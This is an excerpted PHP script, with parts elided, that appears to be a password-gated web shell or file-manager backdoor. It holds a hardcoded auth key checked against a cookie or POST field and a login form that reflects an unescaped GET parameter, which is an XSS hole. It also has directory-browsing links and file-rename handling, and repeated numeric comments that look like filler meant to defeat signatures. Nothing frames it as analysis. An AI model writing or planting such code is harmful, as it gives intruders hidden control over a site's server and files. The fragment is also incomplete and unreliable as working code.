...
$auth_key = "da2e2ca46c1ac822cc38b62bc72860a4";
...
$pass = false;
if (isset($_COOKIE['pw_name_30059'])) {
    if(($_COOKIE['pw_name_30059']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_30059'])) {
        if(($_POST['pw_name_30059']) == $auth_key) {
            setcookie("pw_name_30059", $_POST['pw_name_30059']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_30059' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724179015492897 1724179015195414 1724179015814773 1724179015425940
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724179015492897 1724179015195414 1724179015814773 1724179015425940
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724179015492897 1724179015195414 1724179015814773 1724179015425940
            $name = PATH . "/" . $_GET['r'];
